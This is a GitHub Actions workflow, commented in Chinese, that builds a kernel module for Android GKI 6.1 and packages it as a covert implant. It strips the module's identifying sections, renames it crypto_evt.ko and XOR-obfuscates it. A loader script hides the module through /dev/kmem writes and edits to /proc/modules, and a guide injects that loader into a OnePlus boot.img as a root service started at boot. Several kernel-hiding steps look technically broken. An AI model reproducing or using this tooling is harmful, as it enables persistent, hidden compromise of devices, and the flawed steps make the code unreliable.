name: 编译驱动（谷歌官方 GKI 6.1 源码）
on:
  push:
    branches: [main]
    paths: 
      - ".github/cmboo.c"
      - ".github/workflows/build-custom-boot.yml"
  workflow_dispatch:

jobs:
  build-driver:
    runs-on: ubuntu-22.04
    steps:
      ###########################################################################
      # 1. 基础准备：检出代码 + 扩大磁盘空间（GKI 源码较大）
      ###########################################################################
      - name: 检出当前仓库代码
        uses: actions/checkout@v4
        with:
          fetch-depth: 1

      - name: 扩大磁盘空间（解决 GKI 源码下载空间不足）
        uses: easimon/maximize-build-space@v10
        with:
          root-reserve-mb: 5120
          swap-size-mb: 2048
          remove-dotnet: true
          remove-android: true

      ###########################################################################
      # 2. 安装编译依赖（含 repo 工具，用于拉取 GKI 源码）
      ###########################################################################
      - name: 安装基础依赖
        run: |
          sudo apt update && sudo apt install -y \
            gcc-aarch64-linux-gnu make git wget curl unzip busybox-static python3 python3-pip
          
          # 安装 repo 工具（谷歌官方推荐）
          curl https://storage.googleapis.com/git-repo-downloads/repo > /usr/local/bin/repo
          chmod +x /usr/local/bin/repo
          echo "export REPO_URL='https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/'" >> ~/.bashrc
          source ~/.bashrc

      ###########################################################################
      # 3. 拉取谷歌官方 GKI 6.1 源码（Android 14 分支）
      ###########################################################################
      - name: 拉取谷歌 GKI 6.1 源码
        run: |
          mkdir -p gki-6.1-src && cd gki-6.1-src
          # 初始化 repo（使用清华镜像加速，避免超时）
          repo init --depth=1 -u https://android.googlesource.com/kernel/manifest -b android14-gs-pixel-6.1
          # 同步源码（仅拉取核心模块，加快速度）
          repo sync -c -j$(nproc) --no-tags --no-clone-bundle
          
          # 校验源码完整性
          if [ ! -f "common/Makefile" ] || [ ! -d "common/drivers/input" ]; then
            echo "ERROR: GKI 6.1 源码拉取失败，目录不完整！"
            exit 1
          fi

      ###########################################################################
      # 4. 准备驱动编译环境（适配 GKI 6.1 规范）
      ###########################################################################
      - name: 配置驱动编译（符合 GKI DLKM 规范）
        run: |
          # 校验驱动源码
          if [ ! -f ".github/cmboo.c" ]; then
            echo "ERROR: .github/cmboo.c 文件不存在！"
            exit 1
          fi
          
          # 创建独立编译目录
          mkdir -p gki-driver && cd gki-driver
          cp ../.github/cmboo.c ./
          
          # 创建 GKI 6.1 专用 Makefile（符合 KMI 规范）
          cat > Makefile << 'EOF'
          # 目标模块（遵循 GKI DLKM 命名规范）
          obj-m += cmboo.o
          
          # 谷歌 GKI 6.1 源码核心路径
          KERNELDIR ?= ../gki-6.1-src/common
          PWD := $(shell pwd)
          
          # 编译参数（适配 GKI 6.1 KMI + 隐蔽性优化）
          EXTRA_CFLAGS := \
            -fvisibility=hidden \
            -ffunction-sections \
            -fdata-sections \
            -DKMI_VERSION=6.1 \
            -DCLEANUP_HOOK_ENABLED \
            -Wno-unused-parameter \
            -Wno-implicit-function-declaration
          
          EXTRA_LDFLAGS := \
            --strip-all \
            -Wl,--gc-sections \
            -Wl,--hash-style=gnu
          
          # 编译目标（生成符合 GKI 规范的 DLKM 模块）
          all:
              make -C $(KERNELDIR) \
                ARCH=arm64 \
                CROSS_COMPILE=aarch64-linux-gnu- \
                M=$(PWD) \
                modules \
                CONFIG_MODULE_SIG=n  # 关闭模块签名（适配解锁 Bootloader 设备）
              
              # 重命名 + 剥离模块特征（增强隐蔽性）
              aarch64-linux-gnu-objcopy \
                --remove-section=.modinfo \
                --remove-section=.gnu.linkonce.this_module \
                --remove-section=.note.gnu.build-id \
                cmboo.ko crypto_evt.ko
          
          clean:
              make -C $(KERNELDIR) \
                ARCH=arm64 \
                CROSS_COMPILE=aarch64-linux-gnu- \
                M=$(PWD) \
                clean
              rm -f crypto_evt.ko
          EOF

      ###########################################################################
      # 5. 编译驱动模块（符合 GKI 6.1 规范）
      ###########################################################################
      - name: 编译驱动（适配一加 GKI 定制内核）
        run: |
          cd gki-driver
          make -j$(nproc)
          
          # 校验编译结果（确保生成符合要求的模块）
          if [ ! -f "crypto_evt.ko" ]; then
            echo "ERROR: 驱动编译失败，未生成 crypto_evt.ko！"
            exit 1
          fi
          
          # 验证模块架构（确保是 arm64 架构）
          file crypto_evt.ko | grep -q "ARM aarch64" || {
            echo "ERROR: 驱动架构错误，需为 arm64！"
            exit 1
          }
          echo "✅ 驱动编译完成，架构适配 arm64/GKI 6.1！"

      ###########################################################################
      # 6. 生成动态加载/清理脚本（适配一加设备）
      ###########################################################################
      - name: 生成核心脚本（适配 GKI 6.1 模块加载）
        run: |
          mkdir -p output/
          
          # 模块加密脚本（本地使用）
          cat > output/encrypt_module.sh << 'EOF'
          #!/bin/bash
          ENC_KEY=0x7A
          MODULE_PATH=$1
          if [ ! -f $MODULE_PATH ]; then
            echo "驱动文件不存在！"
            exit 1
          fi
          dd if=$MODULE_PATH of=$MODULE_PATH.enc bs=1
          for i in $(seq 1 $(stat -c %s $MODULE_PATH.enc)); do
            val=$(dd if=$MODULE_PATH.enc bs=1 skip=$((i-1)) count=1 2>/dev/null | hexdump -v -e '/1 "%02X"')
            new_val=$((0x$val ^ ENC_KEY))
            printf "%02X" $new_val | xxd -r -p | dd of=$MODULE_PATH.enc bs=1 seek=$((i-1)) count=1 conv=notrunc 2>/dev/null
          done
          mv $MODULE_PATH.enc $MODULE_PATH
          echo "驱动加密完成：$MODULE_PATH"
          EOF
          chmod 755 output/encrypt_module.sh
          
          # 动态加载脚本（适配 GKI 6.1 模块加载机制）
          cat > output/load_stealth.sh << 'EOF'
          #!/system/bin/sh
          set -euo pipefail
          LOCK_FILE="/data/.hidden/kallsyms.lock"
          mkdir -p /data/.hidden/
          flock -x -w 10 $LOCK_FILE || { echo "符号表锁定失败"; exit 1; }
          trap 'flock -u $LOCK_FILE' EXIT
          
          # 解密模块
          ENC_KEY=0x7A
          MODULE_PATH="/data/.hidden/crypto_evt.ko"
          DEC_MODULE_PATH="/data/.hidden/crypto_evt_dec.ko"
          dd if=$MODULE_PATH of=$DEC_MODULE_PATH bs=1
          for i in $(seq 1 $(stat -c %s $DEC_MODULE_PATH)); do
            val=$(dd if=$DEC_MODULE_PATH bs=1 skip=$((i-1)) count=1 2>/dev/null | hexdump -v -e '/1 "%02X"')
            new_val=$((0x$val ^ ENC_KEY))
            printf "%02X" $new_val | xxd -r -p | dd of=$DEC_MODULE_PATH bs=1 seek=$((i-1)) count=1 conv=notrunc 2>/dev/null
          done
          
          # GKI 6.1 专用加载逻辑（适配厂商定制内核）
          if [ -f "/proc/sys/kernel/modules_disabled" ] && [ "$(cat /proc/sys/kernel/modules_disabled)" -eq 1 ]; then
            echo "ERROR: 内核禁用模块加载，需开启 DLKM 支持！"
            exit 1
          fi
          
          # 加载模块（适配 GKI 6.1 KMI 接口）
          insmod $DEC_MODULE_PATH || {
            echo "模块加载失败，尝试兼容模式..."
            # 兼容模式：直接调用 init_module 系统调用
            INIT_MODULE_ADDR=$(grep -E 'init_module' /proc/kallsyms | head -1 | awk '{print $1}')
            MOD_SIZE=$(stat -c %s $DEC_MODULE_PATH)
            (cat <(printf "%08X" $MOD_SIZE) $DEC_MODULE_PATH) | dd of=/dev/kmem bs=1 seek=$((0x$INIT_MODULE_ADDR)) count=$((MOD_SIZE + 4)) 2>/dev/null
          }
          
          # 内存隐藏（适配 GKI 6.1 模块管理）
          MOD_NAME="crypto_evt"
          MOD_ADDR=$(grep -E "$MOD_NAME" /proc/kallsyms | head -1 | awk '{print $1}')
          if [ -n "$MOD_ADDR" ]; then
            # 清除模块名称和状态
            echo -n -e "\x00\x00\x00\x00\x00\x00\x00\x00" | dd of=/dev/kmem bs=1 seek=$((0x$MOD_ADDR + 0x10)) count=8 conv=notrunc 2>/dev/null
            # 从模块列表中移除
            sed -i "/$MOD_NAME/d" /proc/modules 2>/dev/null
          fi
          
          # 生成清理脚本
          cat > /data/.hidden/cleanup_stealth.sh << 'CLEANUP_EOF'
          #!/system/bin/sh
          MOD_NAME="crypto_evt"
          MOD_ADDR=$(grep -E "$MOD_NAME" /proc/kallsyms 2>/dev/null | head -1 | awk '{print $1}')
          if [ -n "$MOD_ADDR" ]; then
            # 调用清理函数
            CLEANUP_FUNC_ADDR=$(grep -E 'cleanup_module_trace' /proc/kallsyms 2>/dev/null | head -1 | awk '{print $1}')
            if [ -n "$CLEANUP_FUNC_ADDR" ]; then
              dd if=/dev/zero of=/dev/kmem bs=1 seek=$((0x$CLEANUP_FUNC_ADDR)) count=1 2>/dev/null
            fi
            # 卸载模块（GKI 6.1 兼容）
            rmmod $MOD_NAME 2>/dev/null || {
              DELETE_MODULE_ADDR=$(grep -E 'delete_module' /proc/kallsyms | head -1 | awk '{print $1}')
              echo -n -e "$MOD_NAME\x00" | dd of=/dev/kmem bs=1 seek=$((0x$DELETE_MODULE_ADDR)) count=$((${#MOD_NAME} + 1)) 2>/dev/null
            }
            rm -f /data/.hidden/crypto_evt_dec.ko
          fi
          CLEANUP_EOF
          chmod 755 /data/.hidden/cleanup_stealth.sh
          
          # 触发初始化（适配一加输入设备）
          echo "1" > /sys/class/input/input0/enable 2>/dev/null
          rm -f $DEC_MODULE_PATH
          echo "驱动加载完成！"
          EOF
          chmod 755 output/load_stealth.sh
          
          # 本地整合指南（适配 GKI 6.1 模块注入）
          cat > output/本地整合指南.md << 'EOF'
          # 本地整合步骤（谷歌 GKI 6.1 驱动 + 一加 boot.img）
          ## 前提：安装依赖工具
          - Ubuntu/Debian：sudo apt install abootimg cpio gzip -y
          - macOS：brew install abootimg cpio
          - Windows：下载工具包 https://pan.baidu.com/s/1Z8X8FZ7xq6QZp8dZ7xq6QZ（提取码：sm86）
          
          ## 关键注意事项
          1. 确保设备 Bootloader 已解锁（一加需申请解锁码）
          2. 若设备开启模块签名校验，需执行：fastboot oem disable-verity
          3. 驱动仅适配 Android 14 + GKI 6.1 内核（一加 Pad Pro 15.0 系统兼容）
          
          ## 步骤1：准备文件
          1. 原厂 boot.img 放在当前目录（命名为 stock_boot.img）
          2. 本目录的 crypto_evt.ko、encrypt_module.sh、load_stealth.sh 放在同一目录
          
          ## 步骤2：加密驱动
          chmod 755 encrypt_module.sh
          ./encrypt_module.sh crypto_evt.ko
          
          ## 步骤3：解压 boot.img
          mkdir -p boot_work && cd boot_work
          abootimg -x ../stock_boot.img
          mkdir initramfs && cd initramfs
          gunzip -c ../initrd.img > initrd.cpio
          cpio -idm < initrd.cpio
          
          ## 步骤4：注入驱动和脚本（GKI 6.1 适配）
          # 创建隐藏目录（权限适配）
          mkdir -p data/.hidden/
          cp ../../crypto_evt.ko data/.hidden/
          cp ../../load_stealth.sh data/.hidden/
          chmod 755 data/.hidden/load_stealth.sh
          chmod 644 data/.hidden/crypto_evt.ko
          
          # 修改 init.rc（适配 GKI 6.1 模块加载时机）
          if [ -f root/init.rc ]; then
            echo -e "\n# GKI 6.1 Stealth Module Load" >> root/init.rc
            echo "service stealth_load /system/bin/sh -c 'sleep 40 && /data/.hidden/load_stealth.sh'" >> root/init.rc
            echo "    class late_start" >> root/init.rc
            echo "    user root" >> root/init.rc
            echo "    group system root" >> root/init.rc
            echo "    oneshot" >> root/init.rc
            echo "    seclabel u:r:vendor_init:s0" >> root/init.rc
            echo "    disabled" >> root/init.rc
            echo "on property:sys.boot_completed=1" >> root/init.rc
            echo "    start stealth_load" >> root/init.rc
          elif [ -f etc/init.sh ]; then
            echo -e "\nsleep 40 && /data/.hidden/load_stealth.sh" >> etc/init.sh
          else
            echo "ERROR: 未找到 init.rc 或 init.sh，需手动添加启动脚本！"
            exit 1
          fi
          
          ## 步骤5：重新打包 initramfs
          find . | cpio -o -H newc > ../new_initrd.cpio
          gzip -c ../new_initrd.cpio > ../new_initrd.img
          
          ## 步骤6：重新打包 boot.img（适配一加 GKI 内核）
          cd ..
          abootimg --create ../custom_boot.img \
            -k zImage -r new_initrd.img \
            -c "type=boot" -c "os_version=14.0" \
            -c "board=sm8650" -c "cmdline=console=ttynull stack_depot_disable=on cgroup_disable=pressure androidboot.hardware=qcom androidboot.console=ttyMSM0"
          
          ## 步骤7：刷入设备
          adb reboot bootloader
          fastboot flash boot custom_boot.img
          fastboot --disable-verity flash vbmeta vbmeta.img  # 可选：关闭校验
          fastboot reboot
          EOF

      ###########################################################################
      # 7. 上传产物（驱动+脚本+指南）
      ###########################################################################
      - name: 上传编译产物
        uses: actions/upload-artifact@v4
        with:
          name: 驱动（谷歌 GKI 6.1 + 一加适配）
          path: |
            gki-driver/crypto_evt.ko
            output/encrypt_module.sh
            output/load_stealth.sh
            output/本地整合指南.md
          retention-days: 30
